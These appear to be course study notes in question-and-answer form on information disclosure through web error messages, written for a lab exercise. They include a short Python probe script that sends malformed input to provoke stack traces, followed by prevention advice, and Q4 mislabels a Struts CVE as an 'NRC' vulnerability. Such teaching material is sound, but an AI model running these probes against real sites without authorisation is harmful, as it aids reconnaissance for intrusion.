---
course: Web Security
topic: Information Disclosure
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of exploiting information disclosure through error messages?**

The purpose of exploiting information disclosure through error messages is to gain insights into the underlying technology stack and potential vulnerabilities of a web application. By revealing details such as version numbers of frameworks or libraries, attackers can tailor their attacks more effectively, targeting known vulnerabilities associated with specific versions.

**Q2. How can you manually trigger an information disclosure vulnerability via error messages?**

To manually trigger an information disclosure vulnerability via error messages, you can follow these steps:

1. Identify parameters in the application that interact with the backend.
2. Send unexpected input to these parameters, such as non-integer values where integers are expected.
3. Monitor the responses for detailed error messages or stack traces that reveal sensitive information like version numbers of backend technologies.

For example, if a parameter `productID` expects an integer but you input a string like `"abc"`, the application might return an internal server error with a stack trace that includes the version number of a backend framework.

**Q3. Explain how to script the exploitation of an information disclosure vulnerability in Python.**

To script the exploitation of an information disclosure vulnerability in Python, you can use the following approach:

```python
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit_vulnerability(url):
    # Define the proxy settings
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    # Create a session object
    session = requests.Session()

    # Define the vulnerable parameter URL
    product_url = f"{url}/product?productID=abc"

    # Perform the GET request
    response = session.get(product_url, verify=False, proxies=proxies)

    # Check if the response indicates a successful exploitation
    if response.status_code == 500:
        print("Successfully exploited vulnerability.")
        print("Following is the stack trace:")
        print(response.text)
    else:
        print("Could not exploit vulnerability.")
        exit(1)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        exit(1)
    
    url = sys.argv[1]
    exploit_vulnerability(url)
```

This script sends a GET request with unexpected input to a specified URL, checks for a 500 Internal Server Error response, and prints the stack trace if successful.

**Q4. Why is it important to disable stack traces in production environments?**

Disabling stack traces in production environments is crucial because they can reveal sensitive information about the application's backend, such as file paths, version numbers, and even source code snippets. This information can be exploited by attackers to identify and exploit vulnerabilities. For example, a stack trace revealing that an application uses Apache Struts version 2.3.31 could indicate that the application is vulnerable to the NRC vulnerability (CVE-2017-5638), allowing attackers to execute arbitrary commands.

**Q5. How can you prevent information disclosure through error messages in a web application?**

To prevent information disclosure through error messages in a web application, you can implement the following measures:

1. **Disable Detailed Error Messages**: Ensure that detailed error messages and stack traces are disabled in production environments. Instead, configure the application to display generic error messages that do not reveal any sensitive information.

2. **Custom Error Handling**: Implement custom error handling routines that catch exceptions and log them securely without exposing them to users. This can include logging the errors to a file or database while showing a generic error page to the user.

3. **Input Validation**: Validate all inputs thoroughly to ensure they meet the expected format and type. This can help prevent unexpected inputs from triggering detailed error messages.

4. **Regular Audits and Testing**: Regularly audit and test the application for security vulnerabilities, including those related to information disclosure. Use tools like Burp Suite to simulate attacks and check for sensitive data leaks.

By implementing these practices, you can significantly reduce the risk of information disclosure through error messages.

---
<!-- nav -->
[[03-Information Disclosure in Error Messages|Information Disclosure in Error Messages]] | [[Web Security (PortSwigger)/17-Information Disclosure/02-Lab 1 Information disclosure in error messages/00-Overview|Overview]]
